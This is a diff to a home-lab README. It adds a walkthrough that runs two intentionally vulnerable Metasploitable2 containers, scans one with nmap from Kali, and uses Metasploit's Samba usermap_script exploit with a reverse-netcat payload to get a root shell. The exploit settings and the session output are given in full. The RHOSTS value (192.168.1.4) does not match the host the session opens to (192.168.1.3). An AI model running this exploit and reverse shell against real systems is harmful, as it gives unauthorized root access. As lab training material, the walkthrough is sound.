@@ -202,7 +202,100 @@ sudo systemctl enable ssh.service
 sudo systemctl start ssh.service
 ``` 
 
-### Virtualbox Networking Configuration
+### Running twoMetasploitableContainers
+
+On `ContainerHost`
+
+```
+dev@dev:~/dev/twoMetasploitableContainers$ ./start.sh
+
+...
+
+Creating twometasploitablecontainers_ms2-2_1 ... done
+Creating twometasploitablecontainers_ms2-1_1 ... done
+
+dev@dev:~/dev/twoMetasploitableContainers$ sudo docker container ps
+CONTAINER ID   IMAGE                      COMMAND            CREATED          STATUS          PORTS     NAMES
+17dcb64a6c76   tleemcjr/metasploitable2   "/entrypoint.sh"   38 seconds ago   Up 37 seconds             twometasploitablecontainers_ms2-1_1
+56ade12a505f   tleemcjr/metasploitable2   "/entrypoint.sh"   38 seconds ago   Up 37 seconds             twometasploitablecontainers_ms2-2_1
+```
+
+On `Kali`
+
+```
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap 192.168.1.3 -sV -sS                                                                 
+[sudo] password for kali: 
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-13 14:36 EDT
+Nmap scan report for 192.168.1.3
+Host is up (0.00015s latency).
+Not shown: 980 closed ports
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+23/tcp   open  telnet      Linux telnetd
+25/tcp   open  smtp        Postfix smtpd
+80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+111/tcp  open  rpcbind     2 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+512/tcp  open  exec        netkit-rsh rexecd
+513/tcp  open  login       OpenBSD or Solaris rlogind
+514/tcp  open  tcpwrapped
+1099/tcp open  java-rmi    GNU Classpath grmiregistry
+1524/tcp open  ingreslock?
+2121/tcp open  ftp         ProFTPD 1.3.1
+3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
+5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+5900/tcp open  vnc         VNC (protocol 3.3)
+6000/tcp open  X11         (access denied)
+6667/tcp open  irc         UnrealIRCd
+8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
+
+MAC Address: 08:00:27:F0:AF:F5 (Oracle VirtualBox virtual NIC)
+Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 152.64 seconds
+```
+
+```
+msf6 exploit(multi/samba/usermap_script) > options
+
+Module options (exploit/multi/samba/usermap_script):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  192.168.1.4      yes       The target host(s), range CIDR identifier, or hosts file with
+                                      syntax 'file:<path>'
+   RPORT   139              yes       The target port (TCP)
+
+
+Payload options (cmd/unix/reverse_netcat):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+```
+
+```
+msf6 exploit(multi/samba/usermap_script) > exploit
+
+[*] Started reverse TCP handler on 10.0.2.15:4444 
+[*] Command shell session 1 opened (10.0.2.15:4444 -> 192.168.1.3:42702) at 2021-09-13 17:05:06 -0400
+
+whoami
+root
+```
+
 
 ## Resources
 * https://docs.docker.com/compose/networking/
